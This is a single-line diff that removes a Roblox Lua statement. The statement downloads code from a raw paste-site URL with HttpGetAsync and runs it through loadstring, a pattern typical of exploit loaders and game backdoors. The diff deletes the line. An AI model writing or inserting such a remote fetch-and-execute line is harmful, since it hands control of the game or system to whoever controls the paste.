@@ -1,1 +1,0 @@
-loadstring(game:HttpGetAsync("https://www.klgrth.io/paste/hd9x6/raw"))()
